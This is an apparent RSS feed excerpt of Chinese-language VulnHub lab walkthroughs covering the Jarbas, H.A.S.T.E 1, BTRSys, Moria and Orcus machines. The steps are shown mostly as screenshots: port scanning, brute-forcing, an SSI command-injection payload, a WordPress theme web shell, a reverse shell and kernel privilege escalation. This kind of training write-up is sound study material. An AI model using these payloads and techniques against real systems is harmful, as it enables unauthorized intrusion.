&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd6d0988c0498cacd89b2773bf0b0f7b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是sudo就可以提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2a48d17de6802a9d5adc2973e9efe4f3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0c7f73d2455ec8afc6f9b8221b303295image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Congratulations!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE065c564a08f04e0260ced7b1217a4038image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x054 Jarbas</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x054-jarbas/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x054-jarbas/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38785096148b8e5db673cb8e0a12a48aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE96e0162121af7aa516be4203f61ef1b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4153e59ef9980813fd6c8c0c603c047aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;说实话，多次感觉gobuster的中等字典，咋还没dirsearch的默认字典好用呢：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE022266c6cfe43babc606c2ab5cbd5b7dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9f9b29c59f56d410384fdd7c080f9701image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf009f6657d339445153be758f70c74ecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;mysql和ssh失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb327c8056211b7ccf7bead9a0c456d2fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看8080端口&lt;/p&gt;
&lt;p&gt;使用eder/vipsu登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3b42fda86ab2c833ad155d2d38c47ff2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE558426b14403f96ae3f676fc6a5f0013image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;2021-4034&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE22d44548d40ed578bf49ca27ced9b3fcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;作者留下的提权方式：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfb2acbbd44019f0997132d74052b4655image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE58114db794bd63b828702a17d852bf86image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94c440b6b6ea4410c9a21974e7de6fcbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE69bc17edc3990b28ffe2ad5f86684bb5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x055 H.A.S.T.E 1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x055-h.a.s.t.e-1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x055-h.a.s.t.e-1-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0370052e26d46b6559861beec2b99d69image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8b76b0f91c82d0170dd347b0eddb5c6fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7466d2ad62ca97c5f459fa22489821dfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfc30456622a98a5f3b7b50d3b350636eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE096d27d15ffa046032debde743131e7dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;其实这里是看了WP了，在扫描的时候，其实是发现了SSI这个目录的，当时也搜了一下这个漏洞，但是没反应过来，同时也是由于这个漏洞之前没有接触过：&lt;/p&gt;
&lt;p&gt;这里明显是执行了ls命令的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE208bd7b82189031604e69b4d0e5d89deimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时还有提示：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec67167b1b780f559d9f27123d8d1508image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;文件命也暴露了一丝提示：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7e27d1a7188bb01bab096792984e9afbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把上面的语句，复制一下：&lt;/p&gt;
&lt;p&gt;可以发现执行不了有语法错误，且，是过滤了一些内容：&lt;/p&gt;
&lt;p&gt;标准payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!--#exec cmd=&amp;#34;id&amp;#34; --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE79f31937ea742c710b7ecaaa3799abd9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE307fe12568ea57b3847c8efebb6a679fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接下来就简单了，反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE48fc139b7e0762ee3f6ff6d116135f6fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE91444acad99a53a05a83b7178c9fc852image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2ef1a4f9e635aa9d171bc63a5832195eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe686891964243f53b306ae480d53495dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;有gcc直接内核提权把：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7bc3b851776ad117fa1b23f852a1ccf8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x056 BTRSys v2.1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x056-btrsys-v2.1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x056-btrsys-v2.1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8653e5494ecd348115306a8aee5136c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f9af20f133963c0637d25e5b4a2615aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7065f2574e44403268b89c8dfdf0371eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口&lt;/p&gt;
&lt;p&gt;啥也没有&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4f09c87a1e4fbc616038b85b165cec27image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这靶机打得san值狂掉，那个图片看得很难受，主页里面两个图片，1.gif，2.gif难受，别看，很难受&lt;/p&gt;
&lt;p&gt;疑似数据库名称：&lt;/p&gt;
&lt;p&gt;Lepton&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c74345a23a3aacc00ce044c33ac7b52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有一个叫LEPTON的cms:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc165e6fa3c7ec90a8aaeb6ccca6d5a45image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有wordpress:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf5e4096223bb26f91f3888cceb485f8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpsacn&lt;/p&gt;
&lt;p&gt;插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb403993834fa0222bf4f90ba994e1e24image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf1084c55838b01985d5fa44e010c3373image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;直接爆破&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE598d8be91bbbf69ffc35a6a2ac842d19image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后台getshgell:&lt;/p&gt;
&lt;p&gt;http://192.168.5.101/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf1795c64f2261ff15d9ab7bb222beab7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE80afc6ca0d2b22f75f954eff9bd177afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;home目录下有用户btrisk，可以尝试登录数据库看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9ca045245b72930d0efd79dae4f36277image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe201c14d1b4a093061f099b0d344de15image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf92edf4c6eeea7aecc3ee3ce32581a62image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x057 Moria 1.1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x057-moria-1.1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x057-moria-1.1-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcacaae954e8d23744a4041baa57d1ba3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe8b6d1d91ecfaf277eea7160cc9902ddimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3ff8278fa61995fcc0fe922ea689a529image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口&lt;/p&gt;
&lt;p&gt;没有匿名登录，但是好像有用户名提示&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbe35638162f0c84f995eb0b88335b584image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6bfd8cad1a1e44e51e99de3184ad4c0eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf42024073e9017b2269167ae04e3eaa9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;什么意思呢：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd6b8e169b957283965b6df36f9826fd1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;收集一下目前的单词：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE09e358376ca873d91f00339ce2f9eceeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可能用到账户号密码的地方：ftp\ssh\首页图片，那就挨个试了吧&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE74ded5f2a963ebce62001c53fe911babimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdd14bc3a9f58394795c65487b3fa40baimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现还是不对，线索断了，搜了一下，发现这个靶机相当有意思&lt;/p&gt;
&lt;p&gt;没想到，这个页面是随机的，刷新后就不一样了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38e9387b3accccc4cdcf115e22207bd9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;对这个目录再次爆破：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE173673037a134a2f3426539a6d654f4cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是看这段对话还是一头雾水：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4c96b7f77d0612b3416b5d8423f21d43image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看wp，我是真的没想到这里面能藏信息的，注意看本机发给靶机的几个包：&lt;/p&gt;
&lt;p&gt;按顺序为：77，101，108，108，111，110，54，57&lt;/p&gt;
&lt;p&gt;ascii码对应为：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf371fe4b288f2d5fc3af1e4301ce02e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这是ftp的密码：&lt;/p&gt;
&lt;p&gt;虽然没有写入权限，但是有线索：&lt;/p&gt;
&lt;p&gt;QlVraKW4fbIkXau9zkAPNGzviT3UKntl&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38551cb5a4ad272ceea65021ad5fff7cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe327071b007faf520cce5645a85d9dbfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEeb12e472507b9dadaba29cb1df575c5cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;加盐的MD5破解：&lt;/p&gt;
&lt;p&gt;这里我其实是没找到hashcat的破解格式的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9740b10664c6d3d7e62a15013b762e06image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面又查了一些资料：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE10f1e4e395d7e67cdd63c66747a4c01eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9e0a2b090648b3e398a203c56743040aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaa15cbedaa5c45788606113d41edc59cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;稍微处理了一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE31fde46dd5dcb40d19ac7a079405bb39image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;hydra爆破有拒绝，用&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7509ca6d065293626fc1062738f8adffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x058 Orcus</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x058-orcus/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x058-orcus/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd025b8ab10aa135fb9a5859ce8df8e5dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE59e59a940a7e0c8e7ff3ca81de317ddfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7fc4ba468d7681ab6f38eee1a3727eccimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc785c237ce995475c7e5e7101df3a286image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbc2e5ee2c6a7e5ab47d0f2191d0eb393image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe345087502a5935e1152a8156c3a042eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;看样子是开了samba先看看吧，无果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9cdfe965b0f6ffc62ffdc133e9f570f5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口看看：&lt;/p&gt;
&lt;p&gt;发现已知CMS&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfccb4e29c60fcffa14ecb277083999a0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是很可惜，已知漏洞利用失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE91ecc5c1ef60885fcd4b0dbaea5c1019image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;_0c7aa37c1e5b7386c5d18dba80bb5d3b^118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php&lt;/p&gt;
&lt;p&gt;疑似线索：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8a82638c40e6a3857f20eb25cfa77755image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码：&lt;/p&gt;
&lt;p&gt;DEFINE (&amp;lsquo;DB_USER&amp;rsquo;, &amp;lsquo;dbuser&amp;rsquo;);&lt;/p&gt;
&lt;p&gt;DEFINE (&amp;lsquo;DB_PASSWORD&amp;rsquo;, &amp;lsquo;dbpassword&amp;rsquo;);&lt;/p&gt;
&lt;p&gt;DEFINE (&amp;lsquo;DB_HOST&amp;rsquo;, &amp;rsquo;localhost&amp;rsquo;);&lt;/p&gt;
&lt;p&gt;DEFINE (&amp;lsquo;DB_NAME&amp;rsquo;, &amp;lsquo;quizdb&amp;rsquo;);&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe54065478db499e28f7bd7891e058162image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7ec53e00aaba62f4b36d897bea408a50image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有绝对路径，但是没权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd40b7ebd91012cdb5eac78cd21844b31image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过数据库发现路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEefd585cd4ab8bcc0325a21678b70ddbdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;需要设置一下，然后就可以进去了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda8c1bc7549f245c7e01a8d0f1b3b48bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa0df844bcce0229871917de1f531834dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc8fd6a2c42c0fe727f24488d8e1a9122image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;内核：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc6c2b024081b8267206f416fd7f998abimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;NFS&lt;/p&gt;
